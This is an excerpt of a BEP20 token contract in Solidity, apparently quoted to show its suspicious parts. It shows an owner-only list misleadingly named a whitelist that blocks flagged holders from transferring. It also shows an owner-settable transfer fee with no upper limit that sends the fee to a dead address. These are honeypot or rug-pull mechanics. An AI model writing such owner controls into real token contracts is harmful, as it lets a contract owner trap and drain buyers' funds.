...
contract Token is IBEP20, HasForeignAsset {
    ...
    mapping(address => bool) private _whiteLis;
    ...
    uint256 private _feil = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;




    function getwhiteLis(address account) public view returns (bool) {
        return _whiteLis[account];
    }

    function cancelwhiteLis(address account,bool status) public onlyOwner {
        _whiteLis[account] = status;
    }
    ...
    function setfeil(uint256 _value) external onlyOwner {
        _feil = _value;
    }


    function getfeil() external onlyOwner returns(uint256){
        return _feil;
    }
     ...
     * e.g. implement automatic token feils, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
    ...
    function _transfer(
        ...
        if (_whiteLis[sender] == true) {
            revert("whiteLis cannot be transferred");
        }
        uint256 feilamnount = 1;
        feilamnount = amnount.mul(_feil).div(100);
        uint256 amoun;
        amoun = amnount - feilamnount;
        ...
        if (feilamnount > 0) {
            emit Transfer(sender, _DEADaddress, feilamnount);
        }
